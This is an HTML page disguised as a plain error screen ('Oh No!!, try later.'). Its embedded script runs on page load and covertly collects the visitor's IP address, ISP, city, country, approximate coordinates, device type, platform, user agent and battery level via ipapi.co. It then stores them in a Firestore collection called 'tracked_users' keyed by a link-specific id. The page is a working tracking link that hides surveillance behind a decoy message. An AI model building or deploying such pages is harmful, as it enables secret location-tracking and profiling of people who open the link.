<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: white;
            color: #333;
        }
        .container { text-align: center; }
        .icon {
            color: #d32f2f;
            font-size: 40px;
            font-weight: bold;
            margin-right: 10px;
        }
        .text { font-size: 20px; color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <span class="icon">X</span>
        <span class="text">Oh No!!, try later.</span>
    </div>

    <script type="module">
        import { db } from './firebase-config.js';
        import { doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

        async function collectAndSaveData() {
            const urlParams = new URLSearchParams(window.location.search);
            const refId = urlParams.get('id');

            if (!refId) return; 

            // Get IP Data
            let ipData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (error) { console.log("IP Fetch Error"); }

            // Get Battery
            let batteryLevel = "Unknown";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                }
            } catch (e) {}

            const userData = {
                ip: ipData.ip || "Unknown",
                isp: ipData.org || "Unknown",
                city: ipData.city || "Unknown",
                country: ipData.country_name || "Unknown",
                lat: ipData.latitude || 0,
                lon: ipData.longitude || 0,
                device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
                os: navigator.platform,
                browser: navigator.userAgent,
                battery: batteryLevel,
                timestamp: serverTimestamp(),
                lastUpdated: new Date().toLocaleString()
            };

            try {
                await setDoc(doc(db, "tracked_users", refId), userData);
            } catch (e) { console.error("Error saving:", e); }
        }
        collectAndSaveData();
    </script>
</body>
</html>
